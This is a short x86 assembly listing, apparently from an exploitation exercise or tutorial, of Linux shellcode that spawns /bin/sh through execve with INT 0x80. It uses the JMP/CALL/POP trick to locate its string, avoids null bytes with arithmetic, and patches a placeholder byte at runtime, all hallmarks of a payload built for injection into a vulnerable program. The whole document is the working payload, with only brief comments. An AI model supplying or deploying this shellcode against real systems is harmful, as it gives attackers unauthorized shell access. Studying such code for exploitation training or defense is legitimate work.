JMP _WANT_BIN_BASH
_GOT_BIN_BASH:
    MOV EAX, 0x1111111C # 11 - code for execve
    SUB EAX, 0x11111111 # 11 = 286331164 - 286331153 (we do not want a 0 byte)
    POP EBX       # path : /bin/sh
    XOR ECX, ECX  # will result a null (\0), argv = NULL
    MOV [EBX + 7], ECX  #  replace @ with 0 dynamically
    XOR EDX, EDX      # envp = NULL
    INT 0x80
_WANT_BIN_BASH:
    CALL _GOT_BIN_BASH
    .ascii "/bin/sh@" #todo change of arobase
